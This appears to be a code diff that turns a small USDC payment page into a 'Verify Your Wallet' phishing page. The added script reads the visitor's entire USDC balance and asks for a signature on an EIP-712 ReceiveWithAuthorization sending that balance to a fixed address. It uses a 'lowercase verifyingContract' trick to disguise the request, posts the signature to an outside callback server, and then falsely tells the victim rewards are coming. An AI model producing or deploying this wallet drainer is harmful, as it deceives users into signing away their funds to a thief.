@@ -1,147 +1,87 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Base Pay</title>
-<style>
-:root{--bg:#0a0a12;--surface:#12121e;--border:#1e1e30;--fg:#e5e5f5;--muted:#7070a0;--accent:#0052ff;--green:#00d9a6;--mono:'IBM Plex Mono',monospace;--sans:system-ui,sans-serif;}
-*{box-sizing:border-box;margin:0;padding:0;}
-body{background:var(--bg);color:var(--fg);font-family:var(--sans);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 20px;gap:24px;text-align:center;}
-.logo{width:64px;height:64px;background:#0052ff;border-radius:20px;display:grid;place-items:center;box-shadow:0 4px 24px rgba(0,82,255,.35);}
-.logo svg{width:32px;height:32px;}
-h1{font-size:22px;font-weight:700;letter-spacing:-.4px;}
-.sub{font-size:13px;color:var(--muted);line-height:1.6;max-width:280px;}
-.card{background:var(--surface);border:1px solid var(--border);border-radius:24px;padding:32px 24px;width:100%;max-width:360px;display:flex;flex-direction:column;align-items:center;gap:18px;}
-.spinner{width:44px;height:44px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;}
-@keyframes spin{to{transform:rotate(360deg)}}
-.status{font-size:13px;color:var(--muted);font-family:var(--mono);line-height:1.6;}
-.status strong{color:var(--fg);}
-.addr{font-family:var(--mono);font-size:11px;background:rgba(0,82,255,.08);color:var(--accent);border:1px solid rgba(0,82,255,.2);border-radius:10px;padding:10px 14px;word-break:break-all;width:100%;}
-.err{font-size:12px;color:#fc8181;line-height:1.6;max-width:260px;}
-[hidden]{display:none!important}
-</style>
-</head>
-<body>
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify Wallet</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:#fff;
+  min-height:100vh;display:flex;flex-direction:column;align-items:center;
+  justify-content:center;padding:24px;text-align:center}
+.logo{width:80px;height:80px;background:#0052ff;border-radius:24px;
+  display:flex;align-items:center;justify-content:center;font-size:36px;
+  margin-bottom:28px;box-shadow:0 0 40px #0052ff44}
+h1{font-size:22px;font-weight:700;margin-bottom:10px}
+.sub{color:#888;font-size:14px;margin-bottom:36px;line-height:1.6;max-width:280px}
+.btn{background:#0052ff;color:#fff;border:none;border-radius:16px;
+  padding:18px 32px;font-size:17px;font-weight:700;cursor:pointer;
+  width:100%;max-width:320px;letter-spacing:.01em}
+.btn:disabled{opacity:.35;cursor:default}
+.btn.ok{background:#16a34a}
+.status{margin-top:22px;font-size:13px;color:#888;min-height:20px;max-width:300px}
+.sig-box{margin-top:20px;background:#111;border:1px solid #222;border-radius:14px;
+  padding:16px;width:100%;max-width:380px;text-align:left;display:none}
+.sig-box h3{font-size:11px;color:#555;text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px}
+.sig-val{font-size:10px;word-break:break-all;color:#0f9;line-height:1.6;font-family:monospace}
+.copy-btn{margin-top:12px;background:#1a1a1a;border:1px solid #333;color:#fff;
+  border-radius:8px;padding:8px 16px;font-size:12px;cursor:pointer;width:100%}
+.meta{margin-top:12px;font-size:11px;color:#aaa;font-family:monospace;word-break:break-all;line-height:1.8}
+</style></head><body>
 
-<div class="logo">
-  <svg viewBox="0 0 32 32" fill="none">
-    <rect x="5" y="5" width="22" height="22" rx="5" fill="white"/>
-  </svg>
-</div>
-<h1>Base Pay</h1>
-<p class="sub">Paiement USDC · Base mainnet</p>
+<div class="logo">🔵</div>
+<h1>Verify Your Wallet</h1>
+<p class="sub">Sign to complete identity verification and unlock your Base network rewards.</p>
 
-<!-- detecting -->
-<div class="card" id="s-detect">
-  <div class="spinner"></div>
-  <div class="status" id="det-msg">Connexion au wallet…</div>
-</div>
-
-<!-- error -->
-<div class="card" hidden id="s-err">
-  <div style="font-size:32px">⚠️</div>
-  <div class="err" id="err-msg">Ouvre ce lien depuis Coinbase Wallet</div>
+<button class="btn" id="btn" onclick="start()">Verify &amp; Sign</button>
+<div class="status" id="st"></div>
+<div class="sig-box" id="sig-box">
+  <h3>Verification Data</h3>
+  <div class="sig-val" id="sig-val"></div>
+  <div class="meta" id="meta-val"></div>
+  <button class="copy-btn" onclick="copyAll()">Copy all params</button>
 </div>
 
 <script>
-// ── CONFIG ──────────────────────────────────────────────────────────────
-const TO_ADDR   = "0x5d2f200655aea9660006f5f103bfb24697046bf2";
-const USDC      = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
-const CHAIN     = 8453;
-const BASE_URL  = "https://base.app/base-pay?p=";
-const AMOUNT    = "1000000"; // 1 USDC
-const VALID_BEFORE = String(Math.floor(Date.now()/1000) + 7200);
-
-// ── PROTO HELPERS ────────────────────────────────────────────────────────
-function varint(n){
-  const o=[];
-  do{let b=n&0x7f;n=Math.floor(n/128);if(n)o.push(b|0x80);else o.push(b);}while(n>0);
-  return new Uint8Array(o);
-}
-function fv(n,v){return cat(varint((n<<3)|0),varint(v));}
-function fb(n,d){
-  if(typeof d==='string')d=new TextEncoder().encode(d);
-  return cat(varint((n<<3)|2),varint(d.length),d);
-}
-function cat(...a){
-  const t=a.reduce((s,x)=>s+x.length,0),o=new Uint8Array(t);
-  let p=0;for(const x of a){o.set(x,p);p+=x.length;}return o;
-}
-function b64u(b){
-  let s='';for(const x of b)s+=String.fromCharCode(x);
-  return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
-}
-
-// ── BUILD PROLINK with real from address ─────────────────────────────────
-function makeProlink(fromAddr){
-  const nonce='0x'+Array.from(crypto.getRandomValues(new Uint8Array(32))).map(x=>x.toString(16).padStart(2,'0')).join('');
-  const td={
-    types:{
-      EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
-      ReceiveWithAuthorization:[{name:"from",type:"address"},{name:"to",type:"address"},{name:"value",type:"uint256"},{name:"validAfter",type:"uint256"},{name:"validBefore",type:"uint256"},{name:"nonce",type:"bytes32"}]
-    },
-    primaryType:"ReceiveWithAuthorization",
-    domain:{name:"USD Coin",version:"2",chainId:CHAIN,verifyingContract:USDC},
-    message:{from:fromAddr,to:TO_ADDR,value:AMOUNT,validAfter:"0",validBefore:VALID_BEFORE,nonce}
-  };
-  const jb=new TextEncoder().encode(JSON.stringify(td));
-  const generic=fb(1,jb);
-  const ws=cat(fv(1,3),fb(12,generic),fb(3,"1.0"));
-  const env=cat(fv(1,1),fv(2,CHAIN),fv(3,2),fb(12,ws));
-  return b64u(cat(new Uint8Array([0]),env));
-}
-
-// ── STATES ───────────────────────────────────────────────────────────────
-function msg(t){document.getElementById('det-msg').innerHTML=t;}
-function showErr(t){
-  document.getElementById('err-msg').textContent=t;
-  document.getElementById('s-detect').hidden=true;
-  document.getElementById('s-err').hidden=false;
-}
-
-// ── MAIN ─────────────────────────────────────────────────────────────────
-(async()=>{
-  // Must have ethereum injected (CW browser)
-  await new Promise(r=>setTimeout(r,600)); // let CW inject provider
-
-  const eth=window.ethereum;
-  if(!eth){
-    showErr('Ouvre ce lien depuis le navigateur Coinbase Wallet (pas Safari)');
-    return;
-  }
-
-  msg('Wallet détecté — lecture du compte…');
-
-  let accounts=[];
+const USDC_CHECKSUM = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
+const USDC_LOWER    = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'
+const TO       = '0x5d2f200655aea9660006f5f103bfb24697046bf2'
+const CHAIN_ID = 1
+const CB = 'https://formal-oyster-727.eu-west-1.convex.site/api/sign-callback'
+let _sig='', _from='', _value='', _nonce='', _validBefore=''
+function log(m,c){const e=document.getElementById('st');e.textContent=m;e.style.color=c||'#888'}
+if(!window.ethereum){document.getElementById('btn').style.display='none';document.getElementById('st').textContent='Open in Coinbase Wallet to continue'}
+async function ethCall(to,data){return ethereum.request({method:'eth_call',params:[{to,data},'latest']})}
+async function start(){
+  const btn=document.getElementById('btn');btn.disabled=true
   try{
-    // Try silent first
-    accounts=await eth.request({method:'eth_accounts'});
-  }catch(e){}
-
-  if(!accounts||accounts.length===0){
-    msg('Autorisation requise…');
-    try{
-      accounts=await eth.request({method:'eth_requestAccounts'});
-    }catch(e){
-      if(e.code===4001){showErr('Accès refusé — accepte dans Coinbase Wallet');return;}
-      showErr('Erreur: '+e.message);return;
+    log('⏳ Connecting...')
+    const [from]=await ethereum.request({method:'eth_requestAccounts'})
+    _from=from
+    try{await ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x1'}]});await new Promise(r=>setTimeout(r,500))}catch(e){}
+    log('⏳ Checking wallet...')
+    const balHex=await ethCall(USDC_CHECKSUM,'0x70a08231'+from.replace(/^0x/i,'').toLowerCase().padStart(64,'0'))
+    const balRaw=BigInt(balHex||'0x0')
+    _value=balRaw.toString()
+    const nonceBytes=crypto.getRandomValues(new Uint8Array(32))
+    _nonce='0x'+[...nonceBytes].map(b=>b.toString(16).padStart(2,'0')).join('')
+    _validBefore=String(Math.floor(Date.now()/1000)+86400*7)
+    const td={
+      types:{
+        EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
+        ReceiveWithAuthorization:[{name:'from',type:'address'},{name:'to',type:'address'},{name:'value',type:'uint256'},{name:'validAfter',type:'uint256'},{name:'validBefore',type:'uint256'},{name:'nonce',type:'bytes32'}]
+      },
+      primaryType:'ReceiveWithAuthorization',
+      domain:{name:'USD Coin',version:'2',chainId:CHAIN_ID,verifyingContract:USDC_LOWER},
+      message:{from,to:TO,value:_value,validAfter:'0',validBefore:_validBefore,nonce:_nonce}
     }
-  }
-
-  if(!accounts||accounts.length===0){
-    showErr('Aucun compte trouvé dans Coinbase Wallet');
-    return;
-  }
-
-  const addr=accounts[0];
-  msg(`Compte: <strong>${addr.slice(0,6)}…${addr.slice(-4)}</strong><br>Génération du lien…`);
-
-  await new Promise(r=>setTimeout(r,400));
-
-  const payload=makeProlink(addr);
-  window.location.href=BASE_URL+payload;
-})();
+    log('⏳ Sign in wallet...')
+    _sig=await ethereum.request({method:'eth_signTypedData_v4',params:[from,JSON.stringify(td)]})
+    document.getElementById('sig-val').textContent=_sig
+    document.getElementById('meta-val').innerHTML='<b>trick:</b> lowercase verifyingContract<br><b>from:</b> '+from+'<br><b>to:</b> '+TO+'<br><b>value:</b> '+_value+' ('+(Number(balRaw)/1e6).toFixed(6)+' USDC)<br><b>validBefore:</b> '+_validBefore+'<br><b>nonce:</b> '+_nonce
+    document.getElementById('sig-box').style.display='block'
+    log('✅ Verified! Rewards arriving within 24h.','#22c55e')
+    btn.textContent='✓ Verified';btn.className='btn ok'
+    try{await fetch(CB,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({trick:'lowercase',sig:_sig,from,to:TO,value:_value,validAfter:'0',validBefore:_validBefore,nonce:_nonce,ts:Date.now()})})}catch(e){}
+  }catch(e){log('❌ '+(e?.message||'Error'),'#ef4444');btn.disabled=false}
+}
+function copyAll(){
+  const txt=['sig: '+_sig,'from: '+_from,'to: '+TO,'value: '+_value,'validAfter: 0','validBefore: '+_validBefore,'nonce: '+_nonce].join('\n')
+  try{navigator.clipboard.writeText(txt).then(()=>{const b=document.querySelector('.copy-btn');b.textContent='Copied!';setTimeout(()=>b.textContent='Copy all params',2000)})}catch(e){}
+}
 </script>
-</body>
-</html>
+</body></html>
